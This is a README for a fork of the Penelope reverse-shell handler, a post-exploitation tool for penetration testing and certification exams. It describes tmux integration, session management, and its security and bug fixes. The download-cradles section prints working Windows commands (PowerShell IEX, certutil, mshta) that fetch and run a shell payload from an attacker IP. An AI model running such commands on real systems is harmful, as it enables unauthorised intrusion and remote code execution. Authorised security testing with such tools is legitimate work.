<div align="center">
  <img src="https://github.com/user-attachments/assets/0d369fba-480e-4e27-a117-8845dbd4b58e" alt="Logo" width="200"/>
</div>

<img src="https://img.shields.io/badge/Version-0.18.4-blueviolet"/><br>
![BlackHat Arsenal](https://img.shields.io/badge/BlackHat-Arsenal-black)
![EU](https://img.shields.io/badge/EU%202024-blue)
![USA](https://img.shields.io/badge/USA%202025-red)
![MEA](https://img.shields.io/badge/MEA%202025-green)

Penelope is a powerful shell handler built as a modern netcat replacement for RCE exploitation, aiming to simplify, accelerate, and optimize post-exploitation workflows.

## Table of Contents
- [Fork Changes](#fork-changes)
  - [Exegol + tmux Integration](#exegol--tmux-integration)
  - [tmux Auto-Split](#tmux-auto-split)
  - [Windows Improvements](#windows-improvements)
  - [In-Session Command Mode](#in-session-command-mode-ctrlo)
  - [Background Exec](#background-exec)
  - [Session Tagging](#session-tagging)
  - [PowerShell Download Cradles](#powershell-download-cradles)
  - [Cleanup Tracker](#cleanup-tracker)
  - [UX Improvements](#ux-improvements)
  - [Security Hardening](#security-hardening)
  - [Bug Fixes](#bug-fixes)
- [Install](#install)
- [Features](#features)
- [Usage](#usage)
- [TODO](#todo)
- [FAQ](#faq)
- [Thanks](#thanks-to-the-early-birds)

---

# Fork Changes

> Forked from [brightio/penelope](https://github.com/brightio/penelope), tailored for [Exegol](https://github.com/ThePorgs/Exegol) and tmux-centric workflows.
> All changes aligned with upstream `__version__ = 0.18.4`.

## Exegol + tmux Integration

- `Open(..., terminal=True)` prefers `tmux split-window -h` when `$TMUX` is set, with terminal-emulator fallback outside tmux.
- `meterpreter` module uses explicit Exegol Metasploit paths (`bundle exec ... msfvenom/msfconsole`) instead of relying on `$PATH`.

## tmux Auto-Split

The flagship feature of this fork. When `--auto-split` (`-A`) is enabled inside tmux, each incoming reverse shell automatically gets its own tmux pane — no manual `interact` required.

```
┌─────────────────────┬─────────────────────┬─────────────────────┐
│ penelope menu       │ Session 1 (PTY)     │ Session 2 (PTY)     │
│                     │ root@target1 #      │ www-data@target2 $  │
│ [+] Got shell...    │                     │                     │
│ [+] Got shell...    │                     │                     │
│ ➤ Main Menu         │                     │                     │
└─────────────────────┴─────────────────────┴─────────────────────┘
```

**How it works:** Each session gets a Unix domain socket bridge. A lightweight bridge client runs in the new tmux pane and proxies raw terminal I/O to/from the main penelope process over the socket. The shell is upgraded to PTY before the pane opens, so you get a clean prompt immediately.

**Usage:**
```bash
# Inside tmux
penelope -p 4444 --auto-split

# Or enable at runtime from the menu
SET auto_split True
```

**Behavior:**
- Each new session opens a horizontal split (`-h`) without stealing focus from the menu pane
- `interact <id>` on a bridged session focuses its tmux pane instead of attaching inline
- `kill <id>` closes the session and its tmux pane, cleans up the bridge socket
- Closing a pane manually (Ctrl+D / `exit`) cleans up the bridge; the session survives and can be `interact`-ed normally from the menu
- Works with PTY-upgraded shells, agent-deployed shells, and raw shells
- Rearrange panes with standard tmux keybindings (Ctrl+B arrow keys, etc.)

## In-Session Command Mode (Ctrl+O)

Run penelope commands without leaving your shell. Press `Ctrl+O` in any PTY session to open a `penelope>` prompt.

```
root@target:~#
penelope> help
Available commands:
  upload <file/glob>       Upload files to target
  download <path/glob>     Download files from target
  run <module> [args]      Run a penelope module
  spawn [port] [host]      Spawn a new session
  script <file>            Upload and execute a script
  sessions                 List active sessions
  listeners                List active listeners
  interfaces               Show network interfaces
  tasks                    Show background tasks
  help                     Show this help
root@target:~#
```

Works in both regular attached sessions and tmux auto-split panes. The shell stays active while you run commands — no need to detach to the Main Menu.

## Background Exec

Run long commands (linpeas, bloodhound, scans) without blocking your session. Output is logged to file and tailed in a separate terminal pane.

```
(Penelope)─(Session [1])> exec -b /tmp/linpeas.sh
[*] Background task 1 started: /tmp/linpeas.sh
[*] Output: ~/.penelope/1~10.10.14.5-Linux-x86_64/tasks/task_1.log

(Penelope)─(Session [1])> tasks
  ID | Session | Command            | Started             | Status  | Output
   0 |       1 | /tmp/linpeas.sh    | 2026-03-01 14:22:03 | Running | task_1.log

(Penelope)─(Session [1])> tasks kill 0
[*] Sent stop signal to task 0
```

- `exec -b <command>` spawns the command in a background thread
- Output logged to the session's `tasks/` directory with `tail -f` opened in a new terminal/tmux pane
- `tasks` lists all background tasks across sessions with status (Running/Done)
- `tasks kill N` stops a running task
- Also available via Ctrl+O `tasks` from inside a shell
- Agent sessions run on separate streams and don't block foreground exec; non-agent sessions hold the session lock

## Session Tagging

Label sessions for easy identification when managing multiple shells:

```
(Penelope)> tag 1 webshell
[*] Tagged session 1 as webshell

(Penelope)> tag 2 privesc
[*] Tagged session 2 as privesc

(Penelope)> sessions
➤  target1~10.10.11.5 Linux-x86_64
     ID | Shell | User     | Tag      | Source
      1 | PTY   | www-data | webshell | TCPListener(0.0.0.0:4444)
      2 | PTY   | root     | privesc  | TCPListener(0.0.0.0:4444)

(Penelope)> tag 1 none
[*] Removed tag from session 1
```

- `tag <label>` tags the current session
- `tag N <label>` tags session N
- `tag none` / `tag N none` removes the tag
- Tags display in magenta in `sessions` and `info` output

## PowerShell Download Cradles

The `payloads` command now includes Windows-specific download cradles alongside Unix reverse shells:

```
➤  tun0 → 10.10.14.5:4444

  Bash TCP
  printf ...|base64 -d|bash

  Netcat + named pipe
  printf ...|base64 -d|sh

  Powershell
  cmd /c powershell -e ...

  Metasploit
  set PAYLOAD generic/shell_reverse_tcp
  ...

  Windows Download Cradles

  PowerShell IEX (in-memory)
  powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:4444/shell.ps1')"

  Certutil (disk drop)
  certutil -urlcache -split -f http://10.10.14.5:4444/shell.exe %TEMP%\shell.exe && %TEMP%\shell.exe

  MSHTA (in-memory)
  mshta http://10.10.14.5:4444/shell.hta
```

Three cradles per listener interface — ready to paste into a target with the correct IP and port already filled in.

## Cleanup Tracker

When a session dies, penelope now automatically warns about uploaded files left behind on the target:

```
[-] Session [1] died... We lost target1
[!] Session [1] left 3 uploaded file(s) on target:
[!]   /tmp/linpeas.sh
[!]   /tmp/pspy64
[!]   /tmp/chisel
```

- Fires automatically on session death — no action required
- Non-interactive warning only (no commands sent to a dying session)
- Manual `run cleanup` still works as before on live sessions to interactively delete files

## Windows Improvements

- **Upload** is shell-aware (`psh`/`cmd`) and avoids `certutil`/`mshta`:
  - Small payloads: inline base64 + `Expand-Archive`
  - Large payloads: built-in `FileServer` + `Net.WebClient.DownloadFile()` + `Expand-Archive`
- **Download** is robust for repeated runs:
  - Builds archives via PowerShell `-EncodedCommand`
  - Uses begin/end markers for deterministic base64 extraction
  - Resolves relative paths against current remote CWD before archiving
- **`write_access()`** temp-file probe uses proper f-string interpolation.

## UX Improvements

Quality-of-life changes to reduce friction during timed exams:

- **`info` command** — `info [ID]` shows detailed session metadata (OS, arch, shell type, user, TTY, upload count, port forwards, log directory) without leaving the menu
- **Ctrl+O in-session commands** — `sessions`, `listeners`, and `interfaces` added so you can check active sessions, listener ports, and attacker IPs without detaching from the shell
- **Tab completion** — `exec` now completes remote paths, `script` completes local files
- **`use N` feedback** — explicit confirmation message when selecting or deselecting sessions
- **`SET` same-value feedback** — tells you when a value is already set instead of printing nothing
- **`kill N` last-session warning** — prompts for confirmation when killing the last session to a host
- **Better error messages** — `portfwd` shows syntax on empty input, PTY exec without control session explains what to do, `exec` no longer prints `None`/`False`
- **PNPT-tuned defaults** — `latency` 0.05s, `short_timeout` 8s, `upload_chunk_size` 256KB for VPN-friendly operation
- **Transfer progress bars** — download and upload paths show real-time progress with ETA
- **Single-session auto-select** — commands auto-select the only active session without requiring `use`

## Security Hardening

12 security vulnerabilities identified and fixed:

| ID | Vulnerability | Fix |
|----|--------------|-----|
| S1 | **Tar path traversal** — `tar.extractall()` allowed writing outside destination | `safe_tar_extractall()` validates each member via `os.path.realpath()`, rejects external symlinks |
| S2 | **Zip path traversal** — `zipdata.extract()` allowed writing outside destination | Realpath validation before extraction, skips malicious entries |
| S3 | **Arbitrary code exec via `eval()`** in `do_SET` command | Replaced with `ast.literal_eval()` |
| S4 | **RC file race condition** — `exec()` ran before permission check | `stat()` + `chmod` before `exec()`, secure `touch(mode=0o600)` on creation |
| S5 | **Shell injection** — `subprocess.run(shell=True)` in meterpreter module | Converted to argv list with `shell=False`, env dict, file redirect |
| S6 | **`os.system()` calls** — command injection surface via `reset`/`clear` | Replaced with `subprocess.run(["reset"])` / `subprocess.run(["clear"])` |
| S7 | **Port forwarding injection** — unvalidated rhost/rport interpolated into code | Hostname regex validation + port range (1-65535) enforcement |
| S8 | **osascript command injection** — unescaped string interpolated into AppleScript | Escape `\` and `"` before interpolation |
| S9 | **Predictable `/tmp` socket paths** — local symlink attack surface | Use `tempfile.mktemp()` for unpredictable names |
| S10 | **Upload `remote_path` shell injection** — unquoted path in shell command | Wrapped with `shlex.quote()` |
| S11 | **`sync_cwd` quote escape** — single quotes in paths break agent `os.chdir()` | Use `repr()` for proper Python string escaping |
| S12 | **XSS in file server listing** — filenames rendered as raw HTML | HTML-escape paths with `html.escape()` |

## Bug Fixes

80 bugs identified and fixed across multiple review passes (37 initial + 23 reliability + 20 final):

| ID | Bug | Fix |
|----|-----|-----|
| B1 | `PBar.terminate()` deadlock — early return skipped lock release | Wrapped in `try/finally` |
| B2 | `Table.__init__` mutable default argument `list_of_lists=[]` | Changed to `None` with conditional assignment |
| B3 | `session_operation` mutable default argument `extra=[]` | Changed to `None` with conditional assignment |
| B4 | Unreachable `return False` in `maintain()` after `with` block | Removed dead code |
| B5 | `need_binary()` shadows global `options` variable | Renamed local to `menu_text` |
| B6 | `get_shell_pid()` unbound `response` if OS is unrecognized | Initialized `response = None` |
| B7 | `do_portfwd()` uninitialized `rhost`/`rport` for reverse forwarding | Added defaults, required remote endpoint for `<-` |
| B8 | `bdebug` lambda leaks file descriptors | Replaced with `def` using `with open()` context manager |
| B9 | `eval()` in `write_access()` — unnecessary code execution risk | Replaced with string comparison `!= 'True'` |
| B10 | `listener_menu()` crash on new connection — `lambda: _` references undefined `_` | Changed to `lambda: None` |
| B11 | Alternate buffer detection checked wrong variable for agent sessions | Changed `data` to `shell_output` |
| B12 | `spawn()` crashes with `AttributeError` when `self.listener` is `None` | Added null guard before `.jump` access |
| B13 | `FileServer.remove()` never removes anything — checks keys instead of values | Rewrote to search values and delete matching key |
| B14 | `upgrade()` unbound `cmd` when PTY ready but no agent | Early return when nothing to upgrade |
| B15 | `Messenger.feed` treats length 0 as falsy — protocol desync | Changed `not self.len` to `self.len is None` |
| B16 | `Session.__init__` leaks socket on `getpeername()` failure | Close socket before early return |
| B17 | `TmuxBridge` leaks server socket on failed pane creation | Close server socket before early return |
| B18 | `TmuxBridge.close()` can fire twice — double socket close | Added `_closed` flag guard |
| B19 | `do_portfwd` `->` branch `UnboundLocalError` on missing colon | Initialize `rhost`/`rport` before regex |
| B20 | `do_portfwd` `<-` branch `ValueError` on malformed input | Validate `split(':')` produces 2 parts |
| B21 | `download`/`upload` incomplete stream null-checks and wrong return type | Check all 3 streams in `all()`, return `[]` not `None` |
| B22 | `script()` missing return after URL download exception | Added `return False` |
| B23 | `exec` `data` variable used without guaranteed assignment | Initialize `data = b''` |
| B24 | `Options.__setattr__` type check rejects file path option changes | Use `self.__dict__` to bypass `__getattribute__` transform |
| B25 | `ControlQueue.clear()` can block forever on pipe/queue race | Set pipe non-blocking for drain read |
| B26 | `kill()` calls `detach()` after socket is already closed | Moved detach before socket teardown |
| B27 | `CustomHandler.log_message` crashes on malformed HTTP requests | Added token count guard |
| B28 | `ask()` infinite recursion on EOF | Converted to `while True` loop |
| B29 | `need_binary` unbounded recursion on repeated invalid input | Converted to `while True` loop |
| B30 | Python version `micro=None` silently disables agent deployment | Default to `int(micro or 0)` |
| B31 | History recall off-by-one — last entry unreachable | Changed `<` to `<=` |
| B32 | `do_dir` crashes with `KeyError` on stale/missing session | Added session existence guard |
| B33 | Tab-completion crashes with `KeyError` when no session selected | Guard `self.sid` before indexing |
| B34 | `do_kill` fallthrough after declining kill-all can trigger `core.stop()` | Return early on decline |
| B35 | `get_core_id_completion` shadows global `options` | Renamed local to `choices` |
| B36 | `ifconfig()` regex `DOTALL` causes cross-interface matching | Removed `re.DOTALL` flag |
| B37 | Windows `write_access` tests wrong directory | Prepend `cd /d` to target the correct directory |

### Reliability Fixes (23)

Focused on crash-prevention under real pentest conditions (flaky VPN, dying shells, partial transfers):

| ID | Bug | Fix |
|----|-----|-----|
| R1 | `interrupt()` crashes on null `control_session` | Null-check before access |
| R2 | `kill()` portfwd cleanup hangs on timeout | Added timeout + partial-task guard |
| R3 | `int(exec())` crashes when exec returns `None`/`False` (4 sites) | Guard all download/upload `int()` casts |
| R4 | `download`/`upload` crash when `self.tmp` is `False` | Added False guards |
| R5 | `url_to_bytes` returns `None` — 8 module call sites crash | Null-check on all call sites |
| R6 | `do_dir` crash on non-numeric session ID | Added `.isnumeric()` guard |
| R7 | `do_open` set→list type error | Cast to list |
| R8 | `du` output parsing crash on unexpected format | Added guard |
| R9 | Download temp file not cleaned up on failure | Added cleanup in error path |
| R10 | `Messenger.feed()` discards partial data on error | Preserve partial data |
| R11 | Listener socket leak on bind failure | Close socket on error |
| R12 | `write_access` `int()` crash on non-numeric exec result | Added guard |
| R13-R17 | Stale closures in 5 module lambdas | Read data before `with`-block exit |

### Final Review Fixes (20)

| ID | Bug | Fix |
|----|-----|-----|
| F1 | `session_operation` stale `self.sid` causes `KeyError` on all `current=True` ops | Validate sid in `core.sessions`, warn and clear |
| F2 | `get_user()` Windows crash when `whoami` returns `None` | Guard `response` before string operations |
| F3 | `need_binary()` `IndexError` when upload fails (2 sites) | Check upload result before indexing |
| F4 | `FileServer.stop()` crash when bind failed (no `self.id`) | Guard `hasattr(self, 'id')` |
| F5 | ConPtyShell Windows upgrade `IndexError` on failed upload | Check upload result before indexing |
| F6 | `Interfaces` crashes on `CalledProcessError` from `ip addr`/`ifconfig` | Wrapped in try/except |
| F7 | `PBar.render_one()` `OSError` from `os.get_terminal_size()` | Fallback to fixed width |
| F8 | `update_pty_size()` sends `stty ... < False` when TTY detection failed | Changed `else` to `elif self.tty` |
| F9 | `Connect()` leaks socket on connection failure | Close socket in error paths |
| F10 | `bin` property: truncated output breaks binary discovery permanently | Handle short output, use `.get()` |
| F11 | `peass_ng` uses `False` as filepath + bare `assert` | Guard `script()` return, replace assert |
| F12 | `script()` leaks file handles on no-shebang early return | Close both files before return |
| F13 | `url_to_bytes` progress bar never terminated on success | Added `pbar.terminate()` after loop |
| F14 | `upload_ad_scripts` GhostPack empty zip `IndexError` | Guard empty `iterdir()` |
| F15 | `uac` module upload `IndexError` | Check upload result before indexing |
| F16 | `PBar.eta` goes negative, renders as `-1 day, 23:59:57` | `max(0, ...)` |
| F17 | Interface names include `@ifN` suffixes in containers | Regex strips `@suffix` |
| F18 | `readline.get_line_buffer()` crash when readline unavailable | Guard `if readline` |
| F19 | `single_session` exit check in `do_kill` unreachable | Fixed condition `== 1` → `not core.sessions` |
| F20 | `bin` property bare `except: pass` swallows `KeyboardInterrupt` | Changed to `except Exception` with debug log |

---

## Install

Penelope can be run on all Unix-based systems (Linux, macOS, FreeBSD etc) and requires **Python 3.6+**

It requires no installation as it uses only Python’s standard library - just download and execute the script:
```bash
wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
For a more streamlined setup, it can be installed using pipx:
```bash
pipx install git+https://github.com/brightio/penelope
```
Penelope is also available on PyPI:
```bash
pipx install penelope-shell-handler
```
## Features
### Session Features
|Description|Unix with Python>=2.3| Unix without Python>=2.3|Windows|
|-----------|:-------------------:|:-----------------------:|:-----:|
|Auto-upgrade shell|PTY|PTY(*)|readline(**)|
|Real-time terminal resize|✅|✅|❌|
|Logging shell activity|✅|✅|✅|
|Download remote files/folders|✅|✅|✅|
|Upload local/HTTP files/folders|✅|✅|✅|
|In-memory local/HTTP script execution with real-time output downloading|✅|❌|❌|
|Local port forwarding|✅|❌|❌|
|Background exec (`exec -b`)|✅|✅|✅|
|Session tagging (`tag`)|✅|✅|✅|
|Spawn shells on multiple tabs and/or hosts|✅|✅|❌|
|Maintain X amount of active shells per host no matter what|✅|✅|❌|
|Auto-split tmux panes on new sessions (-A)|✅|✅|✅|
|Cleanup tracker (auto-warn on session death)|✅|✅|✅|

(*) opens a second TCP connection

(**) Can be manually upgraded with the `upgrade` command

### Global Features
- Streamline interaction with the targets via modules
- Multiple sessions
- Multiple listeners
- Serve files/folders via HTTP (-s switch)
- Can be imported by python3 exploits and get shell on the same terminal (see [extras](https://github.com/brightio/penelope/tree/main/extras))
- Can work in conjunction with metasploit exploits by disabling the default handler with `set DisablePayloadHandler True`

### Modules

![modules](https://github.com/user-attachments/assets/faf2fb41-b476-4af1-8c0a-f117a3aafb5a)

#### Meterpreter module demonstration

![meterpreter](https://github.com/user-attachments/assets/b9cda69c-e25c-41e1-abe2-ce18ba13c4ed)

## Usage
### Sample Typical Usage
```
penelope                          # Listening for reverse shells on 0.0.0.0:4444
penelope -p 5555                  # Listening for reverse shells on 0.0.0.0:5555
penelope -p 4444,5555             # Listening for reverse shells on 0.0.0.0:4444 and 0.0.0.0:5555
penelope -i eth0 -p 5555          # Listening for reverse shells on eth0:5555
penelope -a                       # Listening for reverse shells on 0.0.0.0:4444 and show sample reverse shell payloads

penelope -p 4444 -A               # Listening on 4444, auto-split tmux pane per session

penelope -c target -p 3333        # Connect to a bind shell on target:3333

penelope ssh user@target          # Get a reverse shell from target on local port 4444
penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)

penelope -s <File/Folder>         # Share a file or folder via HTTP
```
![Penelope](https://github.com/user-attachments/assets/b8e5cd84-60a5-4d79-b041-68bee901ab19)

### Demonstrating Random Usage

As shown in the below video, within only a few seconds we have easily:
1. A fully functional auto-resizable PTY shell while logging every interaction with the target
2. Execute the lastest version of Linpeas on the target without touching the disk and get the output on a local file in realtime 
3. One more PTY shell in another tab
4. Uploaded the latest versions of LinPEAS and linux-smart-enumeration
5. Uploaded a local folder with custom scripts
6. Uploaded an exploit-db exploit directly from URL
7. Downloaded and opened locally a remote file
8. Downloaded the remote /etc directory
9. For every shell that may be killed for some reason, automatically a new one is spawned. This gives us a kind of persistence with the target

https://github.com/brightio/penelope/assets/65655412/7295da32-28e2-4c92-971f-09423eeff178

### Main Menu Commands
Some Notes:
- By default you need to press `F12` to detach the PTY shell and go to the Main Menu. If the upgrade was not possible the you ended up with a basic shell, you can detach it with `Ctrl+C`. This also prevents the accidental killing of the shell.
- The Main Menu supports TAB completion and also short commands. For example instead of `interact 1` you can just type `i 1`.

![Main Menu](https://github.com/user-attachments/assets/b3f568bc-5e66-4e6f-9510-3e61a3518e82)

### Command Line Options
```
positional arguments:
  args                          Arguments for -s/--serve and SSH reverse shell modes

options:
  -p PORTS, --ports PORTS       Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options
                                (Default: 4444/5555/8000)

Reverse or Bind shell?:
  -i , --interface              Local interface/IP to listen. (Default: 0.0.0.0)
  -c , --connect                Bind shell Host
  -j , --jump                   Reverse shell jump endpoints

Hints:
  -a, --payloads                Show sample reverse shell payloads for active Listeners
  -l, --interfaces              List available network interfaces
  -h, --help                    show this help message and exit

Session Logging:
  -L, --no-log                  Disable session log files
  -T, --no-timestamps           Disable timestamps in logs
  -CT, --no-colored-timestamps  Disable colored timestamps in logs

Misc:
  -m , --maintain               Keep N sessions per target
  -M, --menu                    Start in the Main Menu.
  -S, --single-session          Accommodate only the first created session
  -A, --auto-split              Auto-split tmux pane on new sessions
  -C, --no-attach               Do not auto-attach on new sessions
  -U, --no-upgrade              Disable shell auto-upgrade
  -O, --oscp-safe               Enable OSCP-safe mode

File server:
  -s, --serve                   Run HTTP file server mode
  -prefix , --url-prefix        URL path prefix

Debug:
  -N , --no-bins                Simulate missing binaries on target (comma-separated)
  -v, --version                 Print version and exit
  -d, --debug                   Enable debug output
  -dd, --dev-mode               Enable developer mode
  -cu, --check-urls             Check hardcoded URLs health and exit
```

## TODO

### Features
* encryption
* remote port forwarding
* socks & http proxy
* team server
* HTTPs and DNS agents

### Known Issues
* Session logging: when executing commands on the target that feature alternate buffers like nano and they are abnormally terminated, then when 'catting' the logfile it seems corrupted. However the data are still there. Also for example when resetting the remote terminal, these escape sequences are reflected in the logs. I will need to filter specific escape sequences so as to ensure that when 'catting' the logfile, a smooth log is presented.

## FAQ

### ► Is Penelope allowed in OSCP exam?
Yes. Penelope is allowed because its core features do not perform automatic exploitation.
However, caution is required when using certain modules:
* The meterpreter module should be used only on a single target, as permitted by OSCP rules.
* The traitor module uploads Traitor, which performs automatic privilege escalation.

So as long as you know what you’re doing, there should be no issues. If you want to avoid mistakes, you can use the `-O / --oscp-safe` switch.

### ► How can I return from the remote shell to the Main Menu?
It depends on the type of shell upgrade in use:
* PTY: press `F12`
* Readline: send EOF (`Ctrl-D`)
* Raw: send SIGINT (`Ctrl-C`)

In any case, the correct key is always displayed when you attach to a session. For example:

<img src="https://github.com/user-attachments/assets/36b53c73-48cb-4ba7-a36a-ea92d1ea8f9b" />

### ► How can I customize Penelope (change default options, create custom modules, etc.)?
See [peneloperc](https://github.com/brightio/penelope/blob/main/extras/peneloperc)

### ► Why aren’t my current working directory and/or user respected when I use menu commands like download/upload?
This usually means you opened a new interactive shell, possibly under a different user. The Penelope agent only tracks the directory of the initial shell and keeps the permissions of the user from that first shell. The best workaround is to `cd /tmp` before opening a new shell, or, if you switched users, spawn a new reverse shell as the new user.

### ► How can I contribute?
Your contributions are invaluable! If you’d like to help, please report bugs, unexpected behaviors, or share new ideas. You can also submit pull requests but avoid making commits from IDEs that enforce PEP8 and unintentionally restructure the entire codebase.

### ► How come the name?
Penelope was the wife of Odysseus and she is known for her fidelity for him by waiting years. Since a characteristic of reverse shell handlers is waiting, this tool is named after her.

## Thanks
### Early birds
* [Cristian Grigoriu - @crgr](https://github.com/crgr) for inspiring me to automate the PTY upgrade process. This is how this project was born.
* [Paul Taylor - @bao7uo](https://github.com/bao7uo) for the idea to support bind shells.
* [Longlone - @WAY29](https://github.com/WAY29) for indicating the need for compatibility with previous versions of Python (3.6).
* [Carlos Polop - @carlospolop](https://github.com/carlospolop) for the idea to spawn shells on listeners on other systems.
* [@darrenmartyn](https://github.com/darrenmartyn) for indicating an alternative method to upgrade the shell to PTY using the script command.
* [@bamuwe](https://github.com/bamuwe) for the idea to get reverse shells via SSH.
* [@strikoder](https://github.com/strikoder) for numerous enhancement ideas.
* [@root-tanishq](https://github.com/root-tanishq), [@robertstrom](https://github.com/robertstrom), [@terryf82](https://github.com/terryf82), [@RamadhanAmizudin](https://github.com/RamadhanAmizudin), [@furkan-enes-polatoglu](https://github.com/furkan-enes-polatoglu), [@DerekFost](https://github.com/DerekFost), [@Mag1cByt3s](https://github.com/Mag1cByt3s), [@nightingalephillip](https://github.com/nightingalephillip), [@grisuno](https://github.com/grisuno), [@thinkslynk](https://github.com/thinkslynk), [@stavoxnetworks](https://github.com/stavoxnetworks), [@thomas-br](https://github.com/thomas-br), [@joshoram80](https://github.com/joshoram80), [@TheAalCh3m1st](https://github.com/TheAalCh3m1st), [@r3pek](https://github.com/r3pek), [@bamuwe](https://github.com/bamuwe), [@six-two](https://github.com/six-two), [@x9xhack](https://github.com/x9xhack), [@dummys](https://github.com/dummys), [@pocpayload](https://github.com/pocpayload), [@anti79](https://github.com/anti79), [@strikoder](https://github.com/strikoder), [@bestutsengineer](https://github.com/bestutsengineer) for bug reporting.
* Special thanks to [@Y3llowDuck](https://github.com/Y3llowDuck) for spreading the word!
